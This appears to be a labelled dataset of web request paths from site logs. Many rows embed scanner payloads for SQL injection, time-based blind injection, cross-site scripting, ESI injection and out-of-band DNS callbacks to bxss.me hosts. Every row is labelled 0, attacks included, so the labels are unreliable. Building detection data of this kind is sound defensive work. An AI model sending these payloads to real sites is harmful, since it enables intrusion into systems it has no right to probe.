sentences	labels
xxgk/*****/1088/1095/list.html?new="".gethostbyname(lc(""hitcf"".""tctoobmyab40c.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(112).chr(86).chr(112).chr(84)."" 	 0
wla/*********/daily_clickcount.json.jsp?callback=jquery171030196352313975305_1632325579270') or 7192=7192  	 0
was5/***/search?channelid=254846') and 4918=4211 and ('trvy'='trvy&searchword=天津 	 0
index/******/2021/02/22/javascript:window.close(); 	 0
xxgk/*****/1088/1089/list.html?new=bxss.me/t/xss.html? 	 0
zwgk/****/bmyjs/qtdw/aglyzhaggclhhy/\"javascript:void(0)\" 	 0
index/******/2021/12/15/javascript:window.print() 	 0
qhly/******/2016/10/27/javascript:window.print() 	 0
xxgk/******/tjj/zfxxgkml_2127/tjxx/pcsj/list.html?new="".gethostbyname(lc(""hitjq"".""ajzunypkebe55.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(107).chr(76).chr(115).chr(68)."" 	 0
system/********/js/news%' and 2*3*8=6*8 and 'zdbz'!='zdbz%/newscontent.js 	 0
2016zt/******/2016/12/05/javascript:void(); 	 0
socket.gethostbyname(""hitvv"" ""tkecydzod2611.bxss.me."")[3].to_s) ""/***************/16/images/plugin/voice/hzrecorder.js 	 0
module/********/down.jsp?i_id=23679&colid=72') and 3574=3574 and ('qflz'='qflz 	 0
if(now()=sysdate(),sleep(18),0)/**************/2017-02-16/221.html 	 0
qhsw/******/2019/12/30/javascript:window.print() 	 0
es/******/common/signin.aspx?tbemailaddress=alert(777)returnurl=/******/common/default.aspx 	 0
qhly/******/2021/11/11/javascript:dozoom(14) 	 0
module/**********/visit.jsp?i_columnid=0""xor(if(now()=sysdate(),sleep(15),0))xor""z&i_webid=1&type=1 	 0
lz/******/count/0006013/000000000000/window.location.href 	 0
system/********/code/datainput.jsp?owner=%' and 5256=5256 and '%'=' 	 0
css/****/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 0
swld/******/2021/09/08/013447520'""/>//</script//>//<svg/onload=alert(1510) width=100///>.shtml 	 0
rlzy/****/index_117.html and 1=1 	 0
zwgk//***********/fdzdgknr/qtfdxx/ 	 0
icons/**********/index.php?currency="><script>alert(777);</script>&product_id=109"><script>alert(777);</script>&rt=product/product 	 0
/***********/ui/lib/easyui/themes/bootstrap/linkbutton.css 	 0
system/********/js/photoswipe/3.0.5.1/northwind/ 	 0
icons/****/?app=article&view=item31ab2"">alert(777)0ccba&id=186 	 0
bhzx/config-browser/showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
index/******/2020/01/14/javascript:void(0); 	 0
cgi-bin/*****/system.html?step=2&device=et"/><script>alert(777);</script>bh0 	 0
wp-content/*******/prism-highlight/css.php 	 0
system/resource%' and 2*3*8=6*8 and '8kec'!='8kec%/**/newcalendar/my97datepicker.htm 	 0
ywly/****/wlgc//*/-->'""></iframe></script></style></title></textarea><script >alert(58251)</script> 	 0
cxsj/***********/""><script>alert`01883`</script> 	 0
was5/***/search?channelid=234439&orderby=relevance</script><script>alert`83507`</script>&perpage=24&searchword=1 	 0
jsearchfront/********/jcse/110105008056111<esi:include src=""http://bxss.me/rpb.png""/>/16/images/jquery.waterfall.js 	 0
wla/*********/daily_clickcount.json.jsp?callback=jquery171030196352313975305_1632325579270%') or 9301=9301  	 0
system/********/js'||'/counter.js 	 0
module'""()&%<acx><script >gejm(9023)</script>/*****/grouppic/jquery.ad-gallery.js 	 0
newscenter/******/2021/09/17/javascript:void(0); 	 0
qywh/*********/jsp/ccmr/clientportal/login.jsp?strmessage=<img src=/ onerror="alert(777)"/> 	 0
was5/***/search?channelid=299868%' and 8539=8539  	 0
xinanyanjiu/************/guzhiqihuo' and 2*3*8=6*8 and 'w3ez'='w3ez/ 	 0
xwzx/****/2013jtdt/javascript:stranbody(); 	 0
aux/*******/?site="">alert(777); 	 0
socket.gethostbyname('hitds' 'whdyamzq0c405.bxss.me.')[3].to_s) '/****/gdyx/ 	 0
vc/**/interface/visit.jsp?i_articleid=0&i_columnid=195&i_webid=1&type=2&url=if(now()=sysdate(),sleep(15),0) 	 0
xwzx/****/2019_mtgz/202012/t20201215_264991.html and 1=1 	 0
es/***/alert(777) 	 0
jsearchfront/********/jcse/110105008056111/16/images/plugin/http://bxss.me/t/fit.txt?.jpg/voice.css 	 0
wzdt/****/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 0
was5/***/search?channelid=299868&perpage=1000) and 2954=5470# 	 0
es/******/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php 	 0
newscenter/******/2021/10/22/javascript:window.close(); 	 0
index/******/2021/01/21/013323672'""/><script >alert(1131);</script >.shtml 	 0
kjcx/****/znzgjdqzdhzbyjs/201610/t20161014_103590.html' and 'x'='y 	 0
vc/**/lib/easyui/themes"" and 2*3*8=6*8 and ""sni0""=""sni0/bootstrap/linkbutton.css 	 0
prn/****/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 0
article/******/202101311224351011.html 	 0
system/********/code/datainput.jsp?owner=') or 1511=9167 and '1'='1 	 0
info/****/document.location.href 	 0
images"" and 2*3*8=6*8 and ""ioqg""=""ioqg/*/slick.min.js 	 0
module/*****/ckplayer/ckplayer.js/""><script>alert(1089)</script>?_=1630311745938 	 0
zwgk' and 2*3*8=6*8 and 'dwtj'='dwtj/*****/gcjsbz_sjbz/1.htm 	 0
0""xor(if(now()=sysdate(),sleep(12),0))xor""z/******/ncwywfgz/zws/znx/xmb_gzdxb.htm 	 0
2021zt/******/2021/09/17/javascript:void(0); 	 0
ztzl/****/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 0
xwdt/****/csjs/if(now()=sysdate(),sleep(12),0)/1.htm 	 0
xxgk/******/tjj/zfxxgkml_2127/lzyj/list.html?new=0.6905497045448936&wvstest=javascript:domxssexecutionsink(1,""'/""><xsstag>()locxss"") 	 0
system/********/js/ 	 0
con//***/93txj81c/xhr_send?t=1634940377839 	 0
jsearchfront/********/http://bxss.me/t/fit.txt/110105008056111/16/images/main.css 	 0
zwgk' and 2*3*8=6*8 and 'vrxs'='vrxs/******/rsrm.htm 	 0
news/********/fengxianfangfan?page=1' and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),0)--  	 0
cgi-bin/*******/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="">alert(/777/)&false_positives=without&sort=&asc=false&commit=search 	 0
vc/ui"" and 2*3*8=6*8 and ""hpgu""=""hpgu/***/global.css 	 0
was5/***/search?page=2 and 7610=2301--&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 	 0
jsearchfront/********/jcse/110105008056111/16/images'||'/hanweb.css 	 0
2012zt/****/? 	 0
2017zt/******/2018/02/25/javascript:window.print() 	 0
nul/*******/diary/new/submit.php 	 0
xq/*******/gvideos.php?gid=1 and 1=2 	 0
module/*****/ckplayer/ckplayer.js/"><script>alert(676)</script>?_=1630311547744 	 0
xwzx/****/http://bxss.me/t/fit.txt?.jpg/201812/t20181208_112298.html 	 0
ywly/****/jtysgc/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448' and 9731=9731 and '1'='1 	 0
qhly/******/2021/09/19/javascript:dozoom(9) 	 0
script/*/bxss.me.js 	 0
socket.gethostbyname(""hitih"" ""odvykjbx400e4.bxss.me."")[3].to_s) ""/****/110105008056111/16/images/plugin/voice/hzrecorder.js 	 0
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(668)">?_=1630311544074 	 0
zwgk/****/bmyjs/zzqjcyxt/ycsrmjcy/\"javascript:void(0)\" 	 0
art/****/10//xfs.bxss.me/art_32_242398.html 	 0
ru/*****/ostickrc/scp/tickets.php?a=export&h=9c2601b88c05055b51962b140f5121389&status=" onmouseover="alert(777)" 	 0
zmhd/*****/hfswsj/202109/t20210906_186411'""()&%<acx><script >lnxe(9700)</script>.html 	 0
nbfw/*******/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="">alert(/777/)&false_positives=without&sort=&asc=false&commit=search 	 0
ztpd/****/wd/javascript:void(0); 	 0
ztpd/*****/service/166/exec 	 0
com1/***/sources?resource=alert(/777/)&format=txt 	 0
index/******/2011/04/27/010350883.shtml 	 0
ztpd/******/wmly/javascript:void(0); 	 0
zfld/******/2021/10/20/javascript:window.close(); 	 0
xxgk/*****/1088/1104/bxss.me.html 	 0
en/***********/rdandmanufacture/201412/t20141210_22173.html" and "x"="y 	 0
vc/**/widgets/hanweb"" and 2*3*8=6*8 and ""wnrw""=""wnrw/iconfont/css/iconfont.css 	 0
skin/**/lib/jquery.js;;";;alert(989);;s="?3422345 	 0
was5/***/search?channelid=254846 and 9278=7691-- ymbb&searchword=天津 	 0
2020zt/******/2020/10/01/javascript:void(0); 	 0
vc/**/lib/security/sm2<esi:include src=""http://bxss.me/rpb.png""/>.js 	 0
was5/***/search?channelid=299868&perpage=1000%' or 6928=3050 and '%%'='% 	 0
index/******/2021/09/17/javascript:window.print() 	 0
zwgk/*******/if(now()=sysdate(),sleep(12),0).htm 	 0
vc/**/widgets/scrollup/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/themes/image.css 	 0
socket.gethostbyname('hitqp' 'lpnyaahv5ffcc.bxss.me.')[3].to_s) '/****/202011/t20201106_2279316.html 	 0
jsearchfront/********/jcse/110105008056111/16//xfs.bxss.me/jquery.waterfall.js 	 0
xwzx/****/bmleft.html?wvstest=javascript:domxssexecutionsink(1,""'/""><xsstag>()locxss"") 	 0
include/*******/cookie.helpea.php 	 0
col/*****/index"" and 2*3*8=6*8 and ""yaaq""=""yaaq.html 	 0
col'""()&%<acx><script >tap2(9809)</script>/*****/index.html 	 0
ztzl/******/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/11.htm 	 0
ywly/***************/administration.php?pageaction=saverelease&subaction=submit&dateday=&datemonthnewedit=&dateyearnewedit=&title=<script>alert('777')</script>&summary=deneme&releasebody=deneme&categorynewedit=1&publish=active 	 0
pic/***/11/09/71/11097105_751108.jpg 	 0
zmhd/wdsjs'||'/******/202109/t20210906_186411.html 	 0
newscenter/******/2020/08/03/013218720.shtml 	 0
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448%') or 9782=0455  	 0
zwgk/****/bmyjs/gmzdp/zzqmj/\"javascript:void(0)\" 	 0
xxgk<esi:include src=""http://*******/rpb.png""/>/zzxxgk/tjj/zfxxgkml_2127/xwfbh_2065/list.html 	 0
module/**********/visit.jsp?type=3' and 'f'='f') --&i_webid=1&i_columnid=15&i_articleid=5195 	 0
gjcp/******/images/ 	 0
e/******/addinfo.php?submit=添加信息&classid=1'""()&%<acx><script >87cm(9888)</script>&enews=maddinfo&mid=1 	 0
2021zt/******/2021/06/09/013399706'""/><script >alert(2291);</script >.shtml 	 0
xwzx/*****/zgs16/201610/t20161013_103270.html' and 'x'='x 	 0
jsearchfront/'""()&%<acx><script >nn9n(9186)</script>/****/110105008056111/16/images/plugin/criteria/css.css 	 0
images/*************/ 	 0
pic/*/00/69/91/699157_264159.jpg 	 0
script'||'/*/1905211146429566.js 	 0
newscenter/******/2012/03/01/010663634.shtml 	 0
bxss.me/********/jcse/110105008056111/16/images/main.css 	 0
2017zt/******/2018/01/14/javascript:window.close(); 	 0
0""xor(if(now()=sysdate(),sleep(15),0))xor""z/**/widgets/hanweb/placeholder/placeholder.js 	 0
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15 	 0
qhly/******/2013/02/21/javascript:dozoom(12) 	 0
xwdt/****/csjs/gzdt/11.htm 	 0
wla/*********/daily_clickcount.json.jsp?callback=jquery171030196352313975305_1632325579270') or 2814=2814 # 	 0
vc/ui'""()&%<acx><script >jl8q(9116)</script>/***/easyui/plugins/jquery.linkbutton.js 	 0
xwzx/****/tz17_6387/201811/t20181126_197777.html' and 'x'='x 	 0
module/********/downfile.jsp?classid=0&filename=8ffb8746f7374969ba1a903f538b94d4.doc and 5823=7764 	 0
webwsfw/****/?green=1 and '~~' '~' @@version '~~' '~'>0 	 0
was5/***/search?page=2&channelid=253477' or 9146=9146 /*&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 	 0
system/********/js/news'||'/newscontent.js 	 0
2016zt/***/index.html/"><script>alert(334)</script> 	 0
socket.gethostbyname(""hitbp"" ""hprmrvybad890.bxss.me."")[3].to_s) ""/****/bmjs/qtdw/ 	 0
jsearchfront'""()&%<acx><script >vv4o(9602)</script>/********/jcse/110105008056111/16/images/plugin/hotnews/js.js 	 0
pic/****/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 0
js/*******/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="">alert(/777/)&false_positives=without&sort=&asc=false&commit=search 	 0
was5/***/search?channelid=-1 or 5230=6361#&perpage=1000 	 0
jsearchfront/********/jcse/110105008056111/**/and/**/7659=7659/16/images/plugin/category/js.js 	 0
n42684/*******/n236781/c1556969'||'/content.html 	 0
wp-content/*******/woocommerce/assets/js/zeroclipboard/zeroclipboard.swf?id="))}catch(e){}if(!self.a)self.a=!prompt(document.domain)//&width&height 	 0
n42742/******/index'||'_244329_10.html 	 0
xxgk/******/tjj/zfxxgkml_2127/jytabljg_2061/list.html?new=if(now()=sysdate(),sleep(15),0) 	 0
xxgk/******//*/-->'""></iframe></script></style></title></textarea><script >alert(23728)</script> 	 0
ztzl/****/dtbb/jtdt/202001/t20200119_241938.html 	 0
mail/***/compose.php?mailbox=</script><script>alert(document.domain)</script> 	 0
zwgk'||'/******/ncwywfgz/wzs/ltq/xmb_gzdxb.htm 	 0
system/********/js/jquery/ 	 0
con/*********/jsp/ccmr/clientportal/login.jsp?strmessage=<img src=/ onerror="alert(777)"/> 	 0
uploads/****/rose.php 	 0
zwgk/****/bmyjs/zzqdwzfbmgljgsydw/jst/\"javascript:void(0)\" 	 0
images/*/hanweb.min"" and 2*3*8=6*8 and ""yz1j""=""yz1j.css 	 0
ywly/*****/index.html?continent=%' and 8913=8982 and '%'=' 	 0
col/******/bxss.me/t/xss.html? 	 0
ru/***/sys/listabd2.jsp?bd="/><script>alert(777)</script> 	 0
xxgk/zzxxgk%' and 2*3*8=6*8 and 'ozey'!='ozey%/***/zfxxgkml_2127/hygq_2064/list.html 	 0
zmhd/*****/hfswsj/202109<esi:include src=""http://bxss.me/rpb.png""/>/t20210906_186411.html 	 0
n42742/******/index'||'_244329_1.html 	 0
kjcx/****/wlzb/201610/t20161014_103595.html' and 'x'='x 	 0
was5/***/search?searchword=1&channelid=287219&perpage=24' and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),0)-- &templet=1&token=1 	 0
investors-garden/***/index'||'_2.html 	 0
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime and if(now()=sysdate(),sleep(0),0)/*'xor(if(now()=sysdate(),sleep(0),0))or'""xor(if(now()=sysdate(),sleep(0),0))or""*/&perpage=15&outlinepage=10 	 0
xwzx/****/202107/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
jsearchfront/********/jcse/110105008056111/16/images//xfs.bxss.me/selectpick/css.css 	 0
n42812/******/n42825/index'||'.html 	 0
qhly/******/2016/08/25/javascript:dozoom(9) 	 0
ztsj/**/2017nb/zzqrmzf/\"javascript:void(0)\" 	 0
'.gethostbyname(lc('hitgb'.'hnhjomwt6650a.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(111).chr(81).chr(106).chr(66).'/******/2013/list.html 	 0
module/********/downfile.jsp?classid=0' and 8584=8584 and 'dzfs'='dzfs&filename=187b8cf8c65b4c7e97230bf0e01cd0d4.xls 	 0
xxgk/*****/1088/1103/list.html?new=0.44090732491074247'""()&%<acx><script >thmh(9100)</script> 	 0
'""()&%<acx><script >dwaj(9919)</script>/*****/1079/1081/list.html 	 0
rssdy/*****/upgrade_unattended.php?db_type=<script>alert(777)</script> 	 0
zwgk/****/bmyjs/rmtt/gsl/\"javascript:void(0)\" 	 0
qhly/******/2017/03/31/javascript:dozoom(12) 	 0
qhly/******/2021/10/27/javascript:window.close(); 	 0
qhly/******/2012/10/12/javascript:dozoom(12) 	 0
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15') and 4093=4093 and '1'='1&outlinepage=10 	 0
socket.gethostbyname(""hitbz"" ""lgqjbofgbf0de.bxss.me."")[3].to_s) ""/******/tjj/zfxxgkml_2127/hygq_2064/list.html 	 0
was5/***/search?searchword=1&channelid=287219&perpage=24&templet=1%' and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),0)-- &token=1 	 0
vc/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/***/security/crypto-js.js 	 0
ywzzq/****/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 0
zmhd//***********/hfswsj/zmhdyc.html 	 0
xwzx/****/bxss.me/t/xss.html? 	 0
swwj/******/2021/03/18/javascript:window.print() 	 0
css/data:image/svg xml;charset=utf-8,<svg xmlns='http://**********/2000/svg' viewbox='0 0 27 44'><path d='m0,22l22,0l2.1,2.1l4.2,22l19.9,19.9l22,44l0,22l0,22l0,22z' fill='#007aff'/></svg> 	 0
wdjrzxcp/********/javascript:void(0); 	 0
newscenter/******/2021/06/22/javascript:void(0); 	 0
es/*****/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user 	 0
zwgk/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/*******/gys.htm 	 0
qywh/*******/gvideos.php?gid=1 and 1=1 	 0
ru/******/common/signin.aspx?cbautosignin=""alert(777) 	 0
module/********/down.jsp?i_id=194814&colid=72') and 3163=3163 and ('euuy'='euuy 	 0
qhgov/****/ 	 0
video/****/admin/session_edit.php?page=resume_session.php" onmouseover=confirm(777)//&id=1 	 0
xinanyanjiu/************/guzhiqihuo/2021-01-0""xor(if(now()=sysdate(),sleep(6),0))xor""z/1713.html 	 0
config-browser/showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
ru/******/common/signin.aspx?tbpassword=alert(777)returnurl=/******/common/default.aspx 	 0
xwzx' and 2*3*8=6*8 and 'j93o'='j93o/****/sgaj/201812/t20181208_112298.html 	 0
zwgk/******/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/szss/plx.htm 	 0
index/******/2012/03/02/010667948.shtml 	 0
zwgk/******/ncwywfgz/zws/znx/xmb_gzdxb%' and 2*3*8=6*8 and 'xo9c'!='xo9c%.htm 	 0
col/******//xfs.bxss.me.html 	 0
module/*****/ckplayer/ckplayer.js/""><script>alert(4609)</script>?_=1630312075385 	 0
zwgk' and 2*3*8=6*8 and 'wu4k'='wu4k/*******/zfxxgkzd/1.htm 	 0
index/******/2019/03/22/javascript:window.close(); 	 0
socket.gethostbyname(""hithx"" ""idvruowtd5dcb.bxss.me."")[3].to_s) ""/*****/voice.css 	 0
art<esi:include src=""http://*******/rpb.png""/>/2021/10/11/art_34_242319.html 	 0
xxgk/******/lzyj/list.html?new='.gethostbyname(lc('hitbx'.'spvfhpag08b72.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(120).chr(82).chr(112).chr(65).' 	 0
newscenter/******/2014/05/05/011388733_01.shtml 	 0
vc/ui'||'/***/page.css 	 0
jsearchfront/http://*******/t/fit.txt?.jpg/jcse/110105008056111/16/images/jquery.waterfall.js 	 0
qhly/******/2021/07/31/javascript:window.close(); 	 0
qyzz/***/ltgsz.com?n=11' and 9140=9140 and 'fkoi'='fkoi 	 0
zxgg/********/javascript:void(0); 	 0
rssdy/****/calendar/agenda_list.php?type=personal' onmouseover='confirm(777)'/><!-- 	 0
zwgk/****/bmyjs/zzqzfzcbmyzstsjg/\"javascript:void(0)\" 	 0
jsearchfront/********/jcse/website.js/""><script>alert(4688)</script> 	 0
xxgk/*******/2012/list.html 	 0
zwgk/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/*******/szss/plx.htm 	 0
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime%' and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),0)-- &perpage=15&outlinepage=10 	 0
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(1077)">?_=1630311731384 	 0
module/*****/ckplayer/ckplayer.js/"><script>alert(3759)</script>?_=1630312049002 	 0
zwgk'||'/******/gczlzl/1.htm 	 0
was5/***/search?searchword=1&channelid=287219&perpage=24&templet=1' and 5311=5311 and '1'='1&token=1 	 0
wla/*********/daily_clickcount.json.jsp?callback=jquery171030196352313975305_1632325579270%') or 0706=0706 and '%'=' 	 0
index/******/2012/01/14/javascript:window.close(); 	 0
qhsw/******/2021/04/22'""/>< 	 0
newscenter/******/more/217000000000000/0045/217000000000000_00004535.shtml/""><script>alert(244)</script> 	 0
module/*****/ckplayer/ckplayer.js/"><script>alert(571)</script>?_=1630311519791 	 0
xxgk/*****/1088/1105/list.html?new="".gethostbyname(lc(""hitpo"".""olzowkho8cacd.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(112).chr(85).chr(117).chr(89)."" 	 0
zmhd/*****/hfswsj/201902/t20190227_114790.html 	 0
vc/**//xfs.bxss.me/cookie/jquery.cookie.js 	 0
zwgk/****/bmyjs/gmzdp/\"javascript:void(0)\" 	 0
if(now()=sysdate(),sleep(15),0)/**/encrypt/md5.js 	 0
2012zt/****/jb/"><script>alert(553)</script> 	 0
ztzl/****/bsap/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
module/**********/visit.jsp?i_articleid=5195&i_columnid[0]==2and 3 in &i_columnid[1]=3"and/**/extractvalue(1,concat(char(126),md5(1578504846)))and"&i_webid=1&type=3 	 0
socket.gethostbyname('hitkd' 'fwxpzvdva57f3.bxss.me.')[3].to_s) '/****/list.html 	 0
js/*****/ccmanage.php?find_enc=1&list=1"><script>alert(777)</script> 	 0
blog/wp-content/*******/easyrotator-for-wordpress/b.php 	 0
xxgk/******/2008/list.html?new='.gethostbyname(lc('hitew'.'qzohlkax39949.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(122).chr(90).chr(119).chr(84).' 	 0
zwgk/*****/5619/5625/\"javascript:void(0)\" 	 0
en/**************/csrreports/201908/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
newscenter/******/2021/09/07/013447361'"/><img src=javascript:alert(812)>.shtml 	 0
index/******/2021/12/09/javascript:window.print() 	 0
index/******/2019/10/28/javascript:void(0); 	 0
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448%' or 2971=6140 and '%'=' 	 0
inc/*****/default/install_plugin/dasdasdasdad?plugin=math2py&source=javascript:alert(777) 	 0
wla/*********/daily_clickcount.json.jsp?callback=jquery171030196352313975305_1632325579270') and 0525=2325 and '1'='1 	 0
gjjtwzq/****/magpierss/scripts/magpie_simple.php?url=""><img src= x onerror = alert(777)>url=""> 	 0
vc/**/widgets/scrollup/css/themes/image%' and 2*3*8=6*8 and '14lu'!='14lu%.css 	 0
system/********/interview/room.jsp?wbinterviewid=1033') or 5368=9122 and '1'='1&owner=1707212448 	 0
publish/*****/10596/10711/2013/12/04/20131204162632002948461/javascript:; 	 0
gjcp/*****/upgrade_unattended.php?db_type=<script>alert(777)</script> 	 0
qhly/******/2006/08/22/javascript:window.close(); 	 0
system/********/code/news/click/clicktimes.jsp?wbnewsid=67934&owner=1707212448&type=wbnewsfile&randomid=nattach 	 0
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448%' and 6226=6226 and '%'=' 	 0
newscenter/******/2021/06/17/javascript:window.print() 	 0
xxgk/*****/1079/1081'""()&%<acx><script >dwaj(9657)</script>/list.html 	 0
vc/**/lib/easyui<esi:include src=""http://bxss.me/rpb.png""/>/plugins/jquery.panel.js 	 0
wp-content/*******/nextgen-gallery/xml/media-rss.php?mode=<script>alert(lscs62mk)</script> 	 0
col/******/index.html/"><script>alert(454)</script> 	 0
prn/cgi-bin/******/sharedobjmanager/policy_new/874/policytable?vdom="'/></script><script>alert(777)</script> 	 0
module/*****/icons/ 	 0
ywly/****/dlgc/' and 'x'='y 	 0
newscenter/******/2011/11/28/010549976.shtml 	 0
zfld/******/2021/09/07/013446963.shtml 	 0
module/*****/ckplayer/ckplayer.js/"><script>alert(389)</script>?_=1630311387505 	 0
bxss.me/*****/201610/t20161016_531.html 	 0
template/***/sys/listabd2.jsp?bd="/><script>alert(777)</script> 	 0
swwj/******/2021/09/08/javascript:void(); 	 0
gjcp//*******/switch/switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/images/logo-mobility-controller.gif onload=alert(777)> 	 0
xwzx/****/2019_jtyw/201907/t20190715_220163.html 	 0
xxgk/******/zfczyjs/"".gethostbyname(lc(""hitgl"".""hyaslddy0f211.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(101).chr(70).chr(110).chr(90)."".html 	 0
2017zt/******/2018/01/24/javascript:window.close(); 	 0
xinanyanjiu/**************/javascript:void(0) 	 0
xxgk/******/tjj/zfxxgkml_2127/hygq_2064/"".gethostbyname(lc(""hitme"".""jlapriswb37e9.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(113).chr(82).chr(106).chr(79)."".html 	 0
pic/*/01/25/11/1251134_532797.jpg 	 0
qhsw/******/2021/04/22'""/><iframe src=javascript:alert(2392)>/013373702.shtml 	 0
xxgk/*****/1088/1105/list.html?new='.gethostbyname(lc('hitpv'.'jlryayfm899b5.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(104).chr(67).chr(101).chr(86).' 	 0
hdjl/****/if(now()=sysdate(),sleep(12),0).htm 	 0
xxgk/******/tjj/zfxxgkml_2127/hygq_2064/http://bxss.me/t/fit.txt?.jpg.html 	 0
xq/******/2021/10/22/ 	 0
newscenter/******/2017/09/11/012412201.shtml 	 0
0""xor(if(now()=sysdate(),sleep(12),0))xor""z/******/ywdt/1.htm 	 0
index/******/2020/10/26/javascript:window.close(); 	 0
xxgk/******/'""()&%<acx><script >04kx(9016)</script>.html 	 0
rssdy/****/magpierss/scripts/magpie_simple.php?url=""><img src= x onerror = alert(777)>url=""> 	 0
module/********/downfile.jsp?classid=0&filename=aa5b6197abf74d70b14ec83b8819378f.doc and 8578=6698 	 0
zwgk/if(now()=sysdate(),sleep(12),0)/******/1.htm 	 0
2016zt/******/2016/02/29/javascript:window.close(); 	 0
igi/****/opengovmsgbox.do?appid=4&method=listgovmsgboxs&pagesize=3&siteid=extractvalue(1,concat(char(126),md5(1381995244))) 	 0
vc/**/widgets/scrollup/css/http://bxss.me/t/xss.html? 	 0
ru/wp-content/*******/nextgen-gallery/nggallery.php?test-head='"">alert(777); 	 0
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1' or 7140=5232  	 0
z/210514-1'""()&%<acx><script >rsbr(9996)</script>/*****/93aa5449bf388d846409a3d11e199a08.css 	 0
zxgg/********/javascript:void(0); 	 0
lxwm/******/common/signin.aspx?tbemailaddress=alert(777)returnurl=/******/common/default.aspx 	 0
xxgk/http://*******/t/fit.txt?.jpg/2014/list.html 	 0
xwzx/****/sgaj/bxss.me/t/xss.html? 	 0
ywly/*****/index.html?continent=') and 7475=2093 and ('1'='1 	 0
publish/*****/20518/20526/20567/javascript:; 	 0
